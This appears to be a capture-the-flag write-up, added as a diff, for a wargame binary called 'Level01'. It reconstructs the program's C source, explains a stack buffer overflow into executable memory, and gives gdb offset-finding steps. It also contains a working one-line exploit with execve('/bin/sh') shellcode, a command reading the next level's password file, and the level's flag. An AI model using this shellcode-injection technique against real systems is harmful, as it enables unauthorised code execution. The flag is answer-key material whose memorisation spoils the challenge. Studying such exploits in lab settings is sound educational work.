@@ -1,0 +1,105 @@
+# Level01
+
+## Reconstructed source
+
+```c
+#include <stdio.h>
+#include <string.h>
+
+char a_user_name[256];
+
+int verify_user_name(void)
+{
+    puts("verifying username....");
+    return (strcmp(a_user_name, "dat_wil"));
+}
+
+int verify_user_pass(char *passwd)
+{
+    return (strcmp(passwd, "admin"));
+}
+
+int main(void)
+{
+    char buffer[64];
+    int check;
+
+    puts("********* ADMIN LOGIN PROMPT *********");
+    printf("Enter Username: ");
+    fgets(a_user_name, 256, stdin);
+    check = verify_user_name();
+    if (check != 0)
+    {
+        puts("nope, incorrect username...");
+        return (1);
+    }
+    puts("Enter Password: ");
+    fgets(buffer, 100, stdin);
+    check = verify_user_pass(buffer);
+    if (check != 0)
+    {
+        puts("nope, incorrect password...");
+        return (1);
+    }
+    return (0);
+}
+```
+
+Passing both checks legitimately (`dat_wil` / `admin`) does nothing: `main` just
+returns. There is no `system` call in the program, so the level can only be
+solved by hijacking control flow.
+
+## Vulnerability
+
+Two weaknesses combine into a stack buffer overflow with a reliable code
+landing zone:
+
+1. `fgets(buffer, 100, stdin)` reads up to 99 bytes into `buffer`, which only
+   holds ~64 bytes on the stack. Overflowing it overwrites the saved return
+   address of `main`, giving control of `eip` when `main` returns.
+
+2. The username is read into the global `a_user_name` at the fixed address
+   `0x804a040` (`nm level01 | grep a_user_name`). With `NX disabled` this memory
+   is executable, so it is an ideal place to store shellcode at an address known
+   ahead of time. `verify_user_name` only compares the first 7 bytes against
+   `dat_wil`, so the username can be `"dat_wil" + shellcode`.
+
+## Exploitation
+
+Plan:
+
+```
+Username :  "dat_wil" + shellcode        -> shellcode lands at 0x804a040 + 7 = 0x804a047
+Password :  80 bytes of padding + 0x804a047 (little-endian) -> overwrites the return address
+```
+
+The padding length is a runtime value (stack alignment makes it 80..95), so it
+is measured once with gdb using distinct 4-byte markers:
+
+```sh
+python -c 'print "dat_wil\n" + "AAAABBBBCCCCDDDD...UUUUVVVV"' > /tmp/p
+gdb ./level01
+(gdb) run < /tmp/p
+# Program received signal SIGSEGV
+(gdb) info registers eip        # eip = 0x55555555 ("UUUU") -> offset 80
+```
+
+`UUUU` is the 21st letter group, so the saved return address sits at byte
+`21 * 4 - 4 = 80` of the password.
+
+Final exploit (25-byte `execve("/bin/sh")` shellcode, no NUL / newline bytes):
+
+```sh
+(python -c 'print "dat_wil" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" + "\n" + "A"*80 + "\x47\xa0\x04\x08"'; cat) | ./level01
+whoami                              # level02
+cat /home/users/level02/.pass
+```
+
+`verify_user_pass` fails ("nope, incorrect password..."), but `main` still
+returns afterwards and jumps to `0x804a047`, running the shellcode as level02.
+
+## Flag
+
+```txt
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+```
